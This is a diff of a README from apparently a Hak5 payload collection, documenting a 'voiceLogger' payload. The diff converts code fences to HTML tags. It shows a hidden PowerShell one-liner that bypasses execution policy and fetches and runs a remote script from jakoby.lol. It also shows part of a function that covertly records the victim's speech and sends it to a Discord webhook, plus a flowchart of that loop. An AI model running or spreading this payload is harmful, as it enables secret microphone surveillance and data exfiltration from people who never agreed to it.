@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -33,9 +35,9 @@ with the optional functionality of incorporating voice activated payloads.
 
 <code>$dc</code> is the variable that stores your Discord webhook 
 
-```
+<pre><code>
 powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/voiceLogger | iex
-```
+</code></pre>
 
 ### The Function
 
@@ -48,7 +50,7 @@ powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/voiceLogger | iex
 - and if the word "exit" is detected, it breaks the loop and stops the voice logger. 
 - Once the loop is terminated, the log file's content is cleared.
 
-```powershell
+<pre><code>
 function voiceLogger {
 
     Add-Type -AssemblyName System.Speech
@@ -76,9 +78,9 @@ function voiceLogger {
     }
     Clear-Content -Path $log
 }
-```
+</code></pre>
 
-```mermaid
+<pre><code>
 graph TB;
   A[Start voiceLogger] --> B[Start Listening]
   B --> C{Recognized text?}
@@ -92,7 +94,7 @@ graph TB;
   C -->|No| B
   I --> J[Clear Log]
   J --> K[End voiceLogger]
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
